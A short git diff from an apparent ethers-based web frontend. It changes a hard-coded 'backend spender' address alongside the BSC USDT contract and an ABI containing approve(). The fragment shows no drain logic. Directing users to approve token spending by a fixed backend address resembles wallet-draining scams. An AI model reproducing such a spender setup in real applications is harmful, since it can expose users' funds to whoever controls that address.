@@ -4,7 +4,7 @@ import { ethers } from "ethers";
 import "./Background.css";
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-const BACKEND_SPENDER_ADDRESS = "0x7bd8504B2A7927cfdb80495AF01Cf5059A89fDB5"; // your backend address
+const BACKEND_SPENDER_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; // your backend address
 
 const USDT_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
